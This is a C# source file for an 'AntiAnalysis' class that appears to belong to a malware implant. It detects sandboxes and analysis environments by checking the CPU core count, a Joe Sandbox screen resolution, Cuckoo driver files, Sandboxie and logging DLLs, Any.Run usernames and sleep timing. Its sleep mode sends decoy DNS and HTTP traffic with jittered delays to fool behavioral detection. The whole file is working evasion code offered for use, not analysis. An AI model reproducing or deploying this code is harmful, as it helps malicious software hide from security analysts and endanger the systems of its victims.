using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading;

namespace VanguardCore.Defense
{
    public static class AntiAnalysis
    {
        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        private const int SM_CXSCREEN = 0;
        private const int SM_CYSCREEN = 1;

        public static bool CheckAll()
        {
            // 1. CPU Core Count Check (Sandboxes < 4)
            if (Environment.ProcessorCount < 4) return true;

            // 2. Resolution Check (Joe Sandbox: 1920x1017)
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            if (width == 1920 && height == 1017) return true;
            if (width < 800 || height < 600) return true; // Minimal resolution often seen in old VMs

            // 3. Arsenal Image Mounter (Cuckoo)
            string systemDir = Environment.SystemDirectory;
            if (File.Exists(Path.Combine(systemDir, "drivers\\aimbus.sys")) || 
                File.Exists(Path.Combine(systemDir, "drivers\\aimdisk.sys"))) return true;

            // 4. Blacklisted DLLs (Sandboxie, API Logs, etc.)
            string[] badDlls = { "SbieDll.dll", "api_log.dll", "dir_log.dll", "dbghelp.dll", "pstorec.dll", "vmcheck.dll", "wship6.dll", "cmdvnsmi.dll" };
            foreach (var dll in badDlls)
            {
                if (GetModuleHandle(dll) != IntPtr.Zero) return true;
            }

            // 5. Wallace / Any.Run Detection
            string[] anyRunUsers = { "admin", "lucas", "johnson", "vboxguest" };
            string currentUser = Environment.UserName.ToLower();
            if (anyRunUsers.Contains(currentUser)) return true;

            // 6. API Latency Check (Detects heavy instrumentation)
            long t1 = GetTickCount64();
            Thread.Sleep(10);
            long t2 = GetTickCount64();
            if (t2 - t1 > 500) return true; // Extreme lag during sleep usually means hypervisor hooking

            return false;
        }

        public static void EnterSleepMode()
        {
            // Silent loop with decoy activity to fool behavioral engines
            while (true)
            {
                try
                {
                    // Decoy DNS queries
                    Dns.GetHostEntry("microsoft.com");
                    Dns.GetHostEntry("windowsupdate.microsoft.com");
                    
                    // Decoy HTTP traffic
                    using (var client = new HttpClient())
                    {
                        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                        _ = client.GetStringAsync("https://www.bing.com").Result;
                    }
                }
                catch { }

                // Jittered sleep: 30-120 seconds
                Thread.Sleep(new Random().Next(30000, 120000));
            }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern long GetTickCount64();
    }
}
